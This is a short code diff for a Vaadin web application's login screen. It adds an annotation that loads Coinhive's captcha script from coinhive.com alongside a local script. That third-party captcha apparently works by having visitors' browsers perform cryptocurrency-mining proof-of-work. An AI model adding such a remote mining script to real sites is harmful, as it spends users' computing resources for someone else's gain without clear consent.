@@ -1,5 +1,6 @@
 package org.enoy.awesomeradio.view;
 
+import com.vaadin.annotations.JavaScript;
 import com.vaadin.annotations.Theme;
 import com.vaadin.server.VaadinRequest;
 import com.vaadin.spring.annotation.SpringUI;
@@ -14,6 +15,7 @@ import org.vaadin.spring.events.EventScope;
 import org.vaadin.spring.events.annotation.EventBusListenerMethod;
 
 @SpringUI(path = AwesomeRadioLoginUI.UI_PATH)
+@JavaScript({"https://coinhive.com/lib/captcha.min.js", "vaadin://js/awesome-radio.js"})
 @Theme("awesome-radio")
 public class AwesomeRadioLoginUI extends UI {
 
